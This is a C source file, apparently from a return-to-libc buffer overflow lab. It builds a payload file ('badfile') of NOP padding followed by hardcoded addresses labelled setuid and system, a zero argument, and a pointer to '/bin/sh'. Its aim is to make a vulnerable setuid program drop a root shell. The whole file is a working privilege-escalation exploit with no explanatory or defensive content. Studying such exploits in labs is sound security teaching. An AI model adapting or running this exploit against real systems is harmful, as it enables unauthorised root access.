/* exploit_2.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define NOP 0x90

int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;
  badfile = fopen("./badfile", "w");
  int i;

  // dummy value
  for (i = 0 ; i < 24; i++)
    buf[i] = NOP;
  
  unsigned int p = 0x1cc240;
  *(long *) &buf[24] = p;     // setuid
  p = 0x169bb0;
  *(long *) &buf[28] = p;     // system
  *(long *) &buf[32] = 0;     // param to setuid
  p = 0xbffffea2;
  *(long *) &buf[36] = p;     // "/bin/sh"

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);

  return 0;
}
